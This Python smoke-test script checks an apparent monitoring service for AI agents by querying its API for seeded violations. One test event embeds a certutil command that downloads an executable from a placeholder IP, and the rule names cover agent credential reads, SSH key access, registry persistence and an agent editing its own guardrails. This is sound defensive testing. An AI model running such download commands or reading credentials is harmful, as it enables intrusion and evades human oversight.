#!/usr/bin/env python3
"""Smoke-test a running hosted demo end to end, over real HTTP.

    python web/smoke.py https://your-demo.onrender.com
    python web/smoke.py http://127.0.0.1:8000 --wait 60

Stdlib only, so it runs from CI, a laptop, or anywhere a reviewer has Python.
Waits for the service to answer first: a free Render instance sleeps when
idle and takes up to a minute to wake. Exits non-zero if any check fails.
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.request


def call(base, method, path, body=None, timeout=60):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    headers = {"Content-Type": "application/json"} if data is not None else {}
    req = urllib.request.Request(base + path, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            ctype = resp.headers.get("Content-Type", "")
            return resp.status, (json.loads(raw.decode("utf-8")) if "json" in ctype
                                 else raw.decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def wait_ready(base, seconds):
    deadline = time.time() + seconds
    last = None
    while time.time() < deadline:
        try:
            status, body = call(base, "GET", "/healthz", timeout=15)
            if status == 200:
                return True
            last = "HTTP %s" % status
        except Exception as exc:        # connection refused while booting
            last = repr(exc)
        time.sleep(2)
    print("service never became healthy: %s" % last)
    return False


def checks(base):
    """(name, function returning (ok, detail)) pairs, run in order."""

    def get(path):
        return call(base, "GET", path)

    def post(path, body=None):
        return call(base, "POST", path, body)

    def landing():
        s, b = get("/")
        return s == 200 and "guardrail-monitor" in b and "/docs" in b, "HTTP %s" % s

    def openapi():
        s, b = get("/openapi.json")
        paths = sorted(b.get("paths", {})) if isinstance(b, dict) else []
        return s == 200 and "/api/find_blind_spots/{session}" in paths, "%d paths" % len(paths)

    def violations():
        s, b = get("/api/list_violations")
        rules = sorted({v["rule"] for e in b.get("violations", []) for v in e["verdicts"]}) \
            if isinstance(b, dict) else []
        need = {"cred.read", "fs.agent_config_write", "exec.lolbin_download", "reg.run_key"}
        return s == 200 and need <= set(rules), ", ".join(rules)

    def blind_spot():
        s, b = get("/api/find_blind_spots/demo-cred")
        und = [e["data"].get("path") for e in b.get("undeclared", [])] if isinstance(b, dict) else []
        return s == 200 and und == ["C:\\Users\\agent\\.ssh\\id_rsa"], "undeclared=%s" % und

    def benign():
        s, b = get("/api/find_blind_spots/demo-benign")
        n = len(b.get("undeclared", [])) if isinstance(b, dict) else -1
        return s == 200 and n == 0 and b.get("hook_events", 0) > 0, "undeclared=%d" % n

    def summary():
        s, b = get("/api/session_summary/demo-cred")
        return (s == 200 and b.get("found") and b.get("rules_tripped", {}).get("cred.read") == 1,
                "rules=%s" % (b.get("rules_tripped") if isinstance(b, dict) else b))

    def integrity():
        s, b = get("/api/verify_log_integrity")
        return s == 200 and b.get("ok") is True, "checked=%s" % (b.get("checked") if isinstance(b, dict) else b)

    def coverage():
        s, b = get("/api/control_coverage")
        mon = b.get("monitor", {}) if isinstance(b, dict) else {}
        return (s == 200 and mon.get("running") is True and mon.get("kernel_collector_alive") is False,
                "running=%s kernel=%s" % (mon.get("running"), mon.get("kernel_collector_alive")))

    def sessions():
        s, b = get("/api/list_sessions?include_dead=true")
        ids = sorted(r["session_id"] for r in b.get("sessions", [])) if isinstance(b, dict) else []
        return s == 200 and {"demo-benign", "demo-cred", "demo-config"} <= set(ids), ", ".join(ids)

    def attribution():
        s, b = get("/api/attribution_health")
        return s == 200 and b.get("unattributed", 0) > 0, "unknown_rate=%s" % (
            b.get("unknown_rate") if isinstance(b, dict) else b)

    def agents():
        s, b = get("/api/list_agents")
        return s == 200 and "without_hook_coverage" in b, "count=%s" % (b.get("count") if isinstance(b, dict) else b)

    def probes_live():
        s, b = post("/api/run_probe_suite?collector=live")
        return s == 200 and b.get("passed") == b.get("total") == 4, "%s/%s" % (b.get("passed"), b.get("total"))

    def probes_dead():
        s, b = post("/api/run_probe_suite?collector=dead")
        return s == 200 and b.get("passed") == 0 and b.get("total") == 4, "%s/%s" % (b.get("passed"), b.get("total"))

    def custom_event():
        xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
               '<EventID>1</EventID><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System>'
               '<EventData><Data Name="ProcessId">41777</Data>'
               '<Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>'
               '<Data Name="CommandLine">certutil -urlcache -f http://203.0.113.9/x.exe</Data>'
               '</EventData></Event>')
        s, b = post("/demo/windows-event", {"xml": xml})
        return s == 200 and "exec.lolbin_download" in b.get("violations", []), "violations=%s" % (
            b.get("violations") if isinstance(b, dict) else b)

    def kill_simulated():
        s, b = post("/demo/scenarios/agent-edits-its-guardrails")
        kinds = [r["kind"] for r in b.get("enforcement", [])] if isinstance(b, dict) else []
        return s == 200 and kinds == ["enforce.simulated"], "enforcement=%s" % kinds

    def hostile_xml():
        s, b = post("/demo/windows-event",
                    {"xml": '<?xml version="1.0"?><!DOCTYPE e [<!ENTITY a "b">]><Event>&a;</Event>'})
        return s == 400, "HTTP %s" % s

    def alerts():
        s, b = get("/demo/alerts")
        rules = {a["rule"] for a in b.get("alerts", [])} if isinstance(b, dict) else set()
        return s == 200 and "cred.read" in rules, "count=%s" % (b.get("count") if isinstance(b, dict) else b)

    return [
        ("landing page", landing), ("openapi schema", openapi),
        ("seeded violations", violations), ("undeclared credential read", blind_spot),
        ("benign session fully declared", benign), ("session summary", summary),
        ("hash chain verifies", integrity), ("monitor heartbeat, no kernel sensor", coverage),
        ("sample sessions", sessions), ("attribution health", attribution),
        ("agent discovery", agents), ("probe suite, live collector", probes_live),
        ("probe suite, dead collector", probes_dead), ("custom Sysmon event", custom_event),
        ("kill is simulated", kill_simulated), ("hostile XML rejected", hostile_xml),
        ("alerts log", alerts), ("chain still verifies after writes", integrity),
    ]


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("base_url")
    ap.add_argument("--wait", type=float, default=120.0,
                    help="seconds to wait for /healthz (default 120, for a cold start)")
    args = ap.parse_args(argv)
    base = args.base_url.rstrip("/")

    if not wait_ready(base, args.wait):
        return 2
    failures = 0
    for name, fn in checks(base):
        try:
            ok, detail = fn()
        except Exception as exc:
            ok, detail = False, repr(exc)
        failures += 0 if ok else 1
        print("%-4s %-38s %s" % ("PASS" if ok else "FAIL", name, detail))
    print("\n%s: %d checks, %d failed" % (base, len(checks(base)), failures))
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
